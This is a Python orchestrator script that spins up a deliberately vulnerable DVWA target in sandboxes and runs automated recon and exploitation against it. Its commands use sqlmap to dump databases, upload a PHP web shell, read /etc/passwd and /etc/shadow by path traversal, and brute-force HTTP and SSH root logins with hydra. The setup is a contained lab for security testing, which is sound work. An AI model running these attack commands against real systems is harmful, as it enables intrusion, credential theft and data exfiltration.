"""
red_team.py — OpenClaw Red Team Orchestrator

Architecture:
  1. Spins up the DVWA target sandbox via Daytona SDK
  2. Spins up a recon sandbox and runs nmap + gobuster against the target
  3. For each recon finding, spawns a parallel exploit sandbox (asyncio)
  4. If an exploit succeeds, recursively spawns further sandboxes to chase
     deeper vectors (capped at MAX_DEPTH)
  5. All findings aggregate into /output/findings.json

Usage:
    python orchestrator/red_team.py

Environment variables (see .env.example):
    DAYTONA_API_KEY   — Daytona API key
    DAYTONA_API_URL   — Daytona server URL (default: https://app.daytona.io/api)
    TARGET_IMAGE      — Docker image for DVWA target (default: vulnerables/web-dvwa:latest)
    RED_IMAGE         — Docker image for attack sandboxes (default: openclaw/red:latest)
    MAX_DEPTH         — Maximum exploit recursion depth (default: 3)
    MAX_PARALLEL      — Max concurrent exploit sandboxes (default: 10)
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import signal
import sys
import uuid
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from daytona_sdk import Daytona, DaytonaConfig
from daytona_sdk.models import CreateSandboxParams
from dotenv import load_dotenv

load_dotenv()

# ── Configuration ──────────────────────────────────────────────────────────────
DAYTONA_API_KEY = os.environ["DAYTONA_API_KEY"]
DAYTONA_API_URL = os.getenv("DAYTONA_API_URL", "https://app.daytona.io/api")
TARGET_IMAGE    = os.getenv("TARGET_IMAGE", "vulnerables/web-dvwa:latest")
RED_IMAGE       = os.getenv("RED_IMAGE", "openclaw/red:latest")
MAX_DEPTH       = int(os.getenv("MAX_DEPTH", "3"))
MAX_PARALLEL    = int(os.getenv("MAX_PARALLEL", "10"))
OUTPUT_PATH     = Path(__file__).parent.parent / "output" / "findings.json"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("red_team")

# ── Sandbox registry — cleaned up on exit ─────────────────────────────────────
_REGISTRY: set[str] = set()
_DAYTONA: Daytona | None = None


def _build_client() -> Daytona:
    config = DaytonaConfig(
        api_key=DAYTONA_API_KEY,
        server_url=DAYTONA_API_URL,
    )
    return Daytona(config)


async def _cleanup_all() -> None:
    """Destroy every sandbox that was registered during this run."""
    if not _REGISTRY or _DAYTONA is None:
        return
    log.info("Cleaning up %d sandboxes…", len(_REGISTRY))
    tasks = [_destroy_sandbox(sid) for sid in list(_REGISTRY)]
    await asyncio.gather(*tasks, return_exceptions=True)


def _handle_signal(sig, frame):  # noqa: ANN001
    log.warning("Signal %s received — tearing down sandboxes", sig)
    asyncio.get_event_loop().run_until_complete(_cleanup_all())
    sys.exit(1)


signal.signal(signal.SIGINT, _handle_signal)
signal.signal(signal.SIGTERM, _handle_signal)


# ── Daytona helpers ────────────────────────────────────────────────────────────

async def _create_sandbox(image: str, label: str, env: dict[str, str] | None = None) -> dict[str, str]:
    """Create a Daytona sandbox and wait until it responds to commands."""
    loop = asyncio.get_event_loop()

    def _do_create():
        params = CreateSandboxParams(
            image=image,
            labels={"openclaw.label": label},
            env=env or {},
        )
        return _DAYTONA.sandbox.create(params)

    sandbox = await loop.run_in_executor(None, _do_create)
    sandbox_id = sandbox.id
    _REGISTRY.add(sandbox_id)
    log.info("[%s] sandbox created: %s", label, sandbox_id)

    # Poll until responsive
    for attempt in range(30):
        try:
            def _ping():
                return _DAYTONA.sandbox.execute_command(sandbox_id, "echo ready")
            result = await loop.run_in_executor(None, _ping)
            if result.exit_code == 0:
                break
        except Exception:
            pass
        await asyncio.sleep(2)
    else:
        raise RuntimeError(f"Sandbox {sandbox_id} never became ready")

    # Resolve IP
    def _get_ip():
        r = _DAYTONA.sandbox.execute_command(sandbox_id, "hostname -I | awk '{print $1}'")
        return r.output.strip()

    ip = await loop.run_in_executor(None, _get_ip)
    log.info("[%s] sandbox %s ready at %s", label, sandbox_id, ip)
    return {"sandbox_id": sandbox_id, "ip": ip}


async def _run_command(sandbox_id: str, cmd: str, timeout: int = 120) -> tuple[int, str, str]:
    """Run a shell command in a sandbox. Returns (exit_code, stdout, stderr)."""
    loop = asyncio.get_event_loop()

    def _exec():
        return _DAYTONA.sandbox.execute_command(
            sandbox_id,
            cmd,
            timeout_seconds=timeout,
        )

    result = await loop.run_in_executor(None, _exec)
    return result.exit_code, result.output or "", result.stderr or ""


async def _destroy_sandbox(sandbox_id: str) -> None:
    loop = asyncio.get_event_loop()
    try:
        await loop.run_in_executor(None, lambda: _DAYTONA.sandbox.delete(sandbox_id))
        _REGISTRY.discard(sandbox_id)
        log.info("Destroyed sandbox %s", sandbox_id)
    except Exception as exc:
        log.warning("Failed to destroy %s: %s", sandbox_id, exc)


# ── Recon skill ────────────────────────────────────────────────────────────────

def _parse_nmap_xml(xml_text: str) -> list[dict]:
    findings = []
    try:
        root = ET.fromstring(xml_text)
        for host in root.findall(".//host"):
            for port_el in host.findall(".//port"):
                state = port_el.find("state")
                if state is None or state.get("state") != "open":
                    continue
                service = port_el.find("service")
                portnum = int(port_el.get("portid", 0))
                svc_name = service.get("name", "unknown") if service is not None else "unknown"
                svc_ver = (
                    f"{service.get('product', '')} {service.get('version', '')}".strip()
                    if service is not None
                    else ""
                )
                findings.append({
                    "port": portnum,
                    "protocol": port_el.get("protocol", "tcp"),
                    "state": "open",
                    "service": svc_name,
                    "version": svc_ver,
                })
    except ET.ParseError as e:
        log.warning("nmap XML parse error: %s", e)
    return findings


def _parse_gobuster(output: str, port: int) -> list[dict]:
    paths = []
    for line in output.splitlines():
        line = line.strip()
        if not line or line.startswith("["):
            continue
        # Format: /path (Status: 200) [Size: 1234]
        parts = line.split()
        if not parts:
            continue
        path = parts[0]
        status = None
        size = None
        for p in parts:
            if p.startswith("(Status:"):
                try:
                    status = int(p.replace("(Status:", "").replace(")", ""))
                except ValueError:
                    pass
            if p.startswith("[Size:"):
                try:
                    size = int(p.replace("[Size:", "").replace("]", ""))
                except ValueError:
                    pass
        if path.startswith("/"):
            paths.append({"path": path, "status": status, "size": size, "port": port})
    return paths


def _severity(port_finding: dict, path_findings: list[dict]) -> str:
    port = port_finding["port"]
    service = port_finding.get("service", "")
    if port in (3306, 5432):
        return "critical"
    if service == "http" and any(
        p["path"] for p in path_findings
        if any(kw in (p["path"] or "").lower() for kw in ["admin", "setup", "config", "phpmyadmin"])
    ):
        return "critical"
    if service == "http":
        return "high"
    if port == 22:
        return "medium"
    return "low"


async def run_recon(sandbox_id: str, target_ip: str) -> dict[str, Any]:
    log.info("Starting recon against %s in sandbox %s", target_ip, sandbox_id)

    # nmap
    nmap_cmd = (
        f"nmap -sV -sC -T4 -p 1-65535 --open -oX /tmp/nmap_out.xml {target_ip} 2>&1"
    )
    code, stdout, _ = await _run_command(sandbox_id, nmap_cmd, timeout=300)
    _, xml_out, _ = await _run_command(sandbox_id, "cat /tmp/nmap_out.xml", timeout=30)
    port_findings = _parse_nmap_xml(xml_out)
    log.info("nmap found %d open ports", len(port_findings))

    # gobuster against HTTP ports
    http_ports = [f["port"] for f in port_findings if f["service"] in ("http", "https")]
    if not http_ports:
        http_ports = [80]  # fallback

    wordlist = "/usr/share/wordlists/dirb/common.txt"
    path_findings: list[dict] = []

    async def _gobust(port: int):
        scheme = "https" if "ssl" in str(port) or port == 443 else "http"
        cmd = (
            f"gobuster dir -u {scheme}://{target_ip}:{port} "
            f"-w {wordlist} -q --no-error -o /tmp/gobuster_{port}.txt 2>/dev/null; "
            f"cat /tmp/gobuster_{port}.txt"
        )
        _, out, _ = await _run_command(sandbox_id, cmd, timeout=120)
        return _parse_gobuster(out, port)

    results = await asyncio.gather(*[_gobust(p) for p in http_ports], return_exceptions=True)
    for r in results:
        if isinstance(r, list):
            path_findings.extend(r)

    log.info("gobuster found %d paths", len(path_findings))
    return {
        "target": target_ip,
        "sandbox_id": sandbox_id,
        "ports": port_findings,
        "paths": path_findings,
        "raw_nmap": xml_out,
    }


# ── Exploit skill ──────────────────────────────────────────────────────────────

def _pick_technique(target_ip: str, finding: dict) -> tuple[str, str]:
    """Choose an exploitation tool and build the command."""
    port = finding["port"]
    service = finding.get("service", "")
    path = finding.get("path", "") or ""
    url = f"http://{target_ip}:{port}{path}"

    path_lower = path.lower()

    if service in ("http", "https") and path.endswith(".php"):
        if any(kw in path_lower for kw in ["login", "user", "search", "sqli", "id="]):
            cmd = (
                f"sqlmap -u '{url}?id=1&Submit=Submit' "
                f"--batch --level=3 --risk=2 --dump "
                f"--output-dir=/tmp/sqlmap --timeout=60 2>&1 | tail -100"
            )
            return "sqli", cmd

        if any(kw in path_lower for kw in ["upload", "file"]):
            cmd = (
                "echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/shell.php && "
                f"curl -s -F 'uploaded=@/tmp/shell.php' '{url}' -L 2>&1 | head -50"
            )
            return "file_upload", cmd

    if service in ("http", "https") and any(
        kw in path_lower for kw in ["..", "etc", "passwd"]
    ):
        cmd = (
            f"curl -s --path-as-is '{url}/../../../../../../etc/passwd' 2>&1 | head -30; "
            f"curl -s '{url}' 2>&1 | head -30"
        )
        return "path_traversal", cmd

    if service in ("http", "https") and any(
        kw in path_lower for kw in ["login", "admin", "password"]
    ):
        cmd = (
            f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target_ip} "
            f"http-post-form '{path}:username=^USER^&password=^PASS^:incorrect' "
            f"-t 4 -f 2>&1 | tail -20"
        )
        return "brute_force", cmd

    if service == "mysql" or port == 3306:
        cmd = f"mysql -h {target_ip} -u root --connect-timeout=10 -e 'show databases;' 2>&1"
        return "mysql_anon", cmd

    if service == "ssh" or port == 22:
        cmd = (
            f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target_ip} "
            f"-t 4 -f 2>&1 | tail -20"
        )
        return "ssh_brute", cmd

    # Fallback
    cmd = f"curl -sv '{url}' 2>&1 | head -80"
    return "curl_probe", cmd


def _check_success(technique: str, output: str) -> tuple[bool, dict]:
    evidence: dict = {"raw_snippet": output[:2000]}

    if technique == "sqli":
        if any(kw in output.lower() for kw in ["table:", "dumped to", "retrieved:", "[info] fetched"]):
            tables = [line.split("Table:")[1].strip() for line in output.splitlines() if "Table:" in line]
            evidence["dumped_tables"] = tables
            return True, evidence
        if "error" in output.lower() and "sql" in output.lower():
            evidence["sql_error"] = True
            return True, evidence

    if technique == "path_traversal":
        if "root:" in output or "bin:" in output:
            evidence["passwd_leaked"] = True
            return True, evidence

    if technique == "file_upload":
        if any(kw in output.lower() for kw in ["success", "uploaded", "dvwachuckmnorris"]):
            return True, evidence

    if technique == "brute_force" or technique == "ssh_brute":
        if any(kw in output.lower() for kw in ["[80][http", "[22][ssh", "password:", "login:"]):
            creds = [l for l in output.splitlines() if "[http" in l or "[ssh" in l]
            evidence["credentials"] = creds
            return True, evidence

    if technique == "mysql_anon":
        if "Database" in output and "information_schema" in output:
            evidence["databases"] = [l.strip() for l in output.splitlines() if l.strip() and "Database" not in l]
            return True, evidence

    return False, evidence


def _deeper_vectors(technique: str, target_ip: str, port: int, path: str, evidence: dict) -> list[dict]:
    vectors = []
    if technique == "sqli":
        for table in evidence.get("dumped_tables", []):
            vectors.append({"type": "sqli_table_dump", "target": f"{target_ip}:{port}{path}", "param": table})
    if technique == "path_traversal" and evidence.get("passwd_leaked"):
        for sensitive in ["/etc/shadow", "/proc/self/environ", "/var/log/apache2/access.log"]:
            vectors.append({"type": "path_traversal", "target": f"{target_ip}:{port}", "path": sensitive})
    if technique == "file_upload":
        vectors.append({"type": "webshell_rce", "target": f"{target_ip}:{port}", "path": path})
    return vectors


async def run_exploit(sandbox_id: str, target_ip: str, finding: dict, depth: int = 0) -> dict[str, Any]:
    port = finding["port"]
    path = finding.get("path", "")
    technique, cmd = _pick_technique(target_ip, finding)

    log.info("[depth=%d] exploit %s against %s:%s%s", depth, technique, target_ip, port, path)

    code, stdout, stderr = await _run_command(sandbox_id, cmd, timeout=300)
    output = stdout + stderr

    success, evidence = _check_success(technique, output)
    deeper = []
    if success and depth < MAX_DEPTH:
        deeper = _deeper_vectors(technique, target_ip, port, path, evidence)

    result = {
        "id": str(uuid.uuid4()),
        "success": success,
        "technique": technique,
        "type": technique,
        "severity": finding.get("severity", "medium"),
        "target": f"{target_ip}:{port}{path}",
        "evidence": evidence,
        "raw_output": output[:5000],
        "sandbox_id": sandbox_id,
        "depth": depth,
        "deeper_vectors": deeper,
        "error": None if code == 0 else f"exit_code={code}",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    return result


# ── Orchestrator ───────────────────────────────────────────────────────────────

async def _exploit_finding(
    target_ip: str,
    finding: dict,
    semaphore: asyncio.Semaphore,
    all_findings: list[dict],
    depth: int = 0,
) -> None:
    if depth >= MAX_DEPTH:
        return

    async with semaphore:
        label = f"exploit-d{depth}-{finding.get('technique', finding.get('service', 'unknown'))}"
        try:
            sandbox = await _create_sandbox(RED_IMAGE, label)
            result = await run_exploit(sandbox["sandbox_id"], target_ip, finding, depth)
            all_findings.append(result)
            log.info(
                "Finding %s: success=%s technique=%s",
                result["id"], result["success"], result["technique"]
            )

            if result["success"] and result["deeper_vectors"]:
                log.info(
                    "Spawning %d deeper sandboxes from %s",
                    len(result["deeper_vectors"]), result["id"]
                )
                deep_tasks = [
                    _exploit_finding(
                        target_ip,
                        {**v, "port": finding["port"], "service": finding.get("service", "http")},
                        semaphore,
                        all_findings,
                        depth + 1,
                    )
                    for v in result["deeper_vectors"]
                ]
                await asyncio.gather(*deep_tasks, return_exceptions=True)

        except Exception as exc:
            log.error("Exploit failed for %s: %s", finding, exc)
            all_findings.append({
                "id": str(uuid.uuid4()),
                "success": False,
                "type": "error",
                "severity": "low",
                "target": target_ip,
                "evidence": {},
                "raw_output": str(exc),
                "error": str(exc),
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })
        finally:
            sandbox_id = (sandbox or {}).get("sandbox_id")
            if sandbox_id:
                await _destroy_sandbox(sandbox_id)


async def main() -> None:
    global _DAYTONA
    _DAYTONA = _build_client()

    all_findings: list[dict] = []
    target_sandbox: dict | None = None
    recon_sandbox: dict | None = None

    try:
        # 1. Spin up DVWA target
        log.info("=== Phase 1: Provisioning DVWA target ===")
        target_sandbox = await _create_sandbox(TARGET_IMAGE, "dvwa-target")
        target_ip = target_sandbox["ip"]
        log.info("Target DVWA at %s", target_ip)

        # Give Apache/MySQL a moment to initialise
        await asyncio.sleep(10)

        # 2. Recon
        log.info("=== Phase 2: Recon ===")
        recon_sandbox = await _create_sandbox(RED_IMAGE, "recon")
        recon_results = await run_recon(recon_sandbox["sandbox_id"], target_ip)

        # Build flat finding list: one per (port, path) combination
        exploit_queue: list[dict] = []
        for port_finding in recon_results["ports"]:
            matching_paths = [
                p for p in recon_results["paths"] if p["port"] == port_finding["port"]
            ]
            if matching_paths:
                for path_entry in matching_paths:
                    exploit_queue.append({
                        **port_finding,
                        "path": path_entry["path"],
                        "severity": _severity(port_finding, [path_entry]),
                    })
            else:
                exploit_queue.append({
                    **port_finding,
                    "severity": _severity(port_finding, []),
                })

        # Sort by severity
        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        exploit_queue.sort(key=lambda f: sev_order.get(f.get("severity", "low"), 99))
        log.info("Exploit queue: %d findings (sorted by severity)", len(exploit_queue))

        # 3. Parallel exploitation
        log.info("=== Phase 3: Parallel exploitation ===")
        semaphore = asyncio.Semaphore(MAX_PARALLEL)
        tasks = [
            _exploit_finding(target_ip, f, semaphore, all_findings, depth=0)
            for f in exploit_queue
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    finally:
        # Cleanup recon sandbox early — target kept alive until findings written
        if recon_sandbox:
            await _destroy_sandbox(recon_sandbox["sandbox_id"])

        # 4. Write findings
        log.info("=== Phase 4: Writing findings ===")
        OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)
        summary = {
            "run_id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target_ip": target_sandbox["ip"] if target_sandbox else "unknown",
            "total_findings": len(all_findings),
            "successful_exploits": sum(1 for f in all_findings if f.get("success")),
            "findings": all_findings,
        }
        OUTPUT_PATH.write_text(json.dumps(summary, indent=2))
        log.info(
            "Wrote %d findings (%d successful) to %s",
            len(all_findings),
            summary["successful_exploits"],
            OUTPUT_PATH,
        )

        # Destroy target last
        if target_sandbox:
            await _destroy_sandbox(target_sandbox["sandbox_id"])

        await _cleanup_all()


if __name__ == "__main__":
    asyncio.run(main())
